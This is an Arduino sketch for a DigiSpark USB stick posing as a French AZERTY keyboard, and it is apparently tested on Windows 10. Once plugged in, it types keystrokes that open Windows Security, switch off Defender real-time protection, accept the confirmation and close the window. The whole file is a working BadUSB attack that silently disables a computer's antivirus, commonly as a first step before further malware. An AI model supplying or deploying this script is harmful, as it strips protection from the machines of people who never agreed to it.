#include <DigiKeyboardFr.h>
/*
 * Tested on:
 * AZERTY French Keyboard
 * Microsoft Windows 10 Professionnel - 10.0.19042 N/A Build 19042
 * Microsoft Windows 10 Home          - 10.0.19042 N/A Build 19042
 * 
 */
//This DigiSpark script turns off windows defender in windows10
void setup() {
   //Turn off Windows Defender
  DigiKeyboardFr.delay(3000); // To make USB device ready to communicate
  DigiKeyboardFr.sendKeyStroke(KEY_M, MOD_GUI_LEFT); //minimize all windows
  DigiKeyboardFr.delay(1000);
  DigiKeyboardFr.sendKeyStroke(0, MOD_GUI_LEFT);//open windows start
  DigiKeyboardFr.delay(1000);
  DigiKeyboardFr.println("Windows Secu"); //type windows defender
  DigiKeyboardFr.delay(2000);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(2000);
  DigiKeyboardFr.print("\t");//Press TAB 1
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.print("\t");//Press TAB 2
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.print("\t");//Press TAB 3
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.print("\t");//Press TAB 4
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(1500);
  DigiKeyboardFr.sendKeyStroke(KEY_SPACE);
  DigiKeyboardFr.delay(1500);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(2000);
  DigiKeyboardFr.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); //close window
}
void loop(){

  }
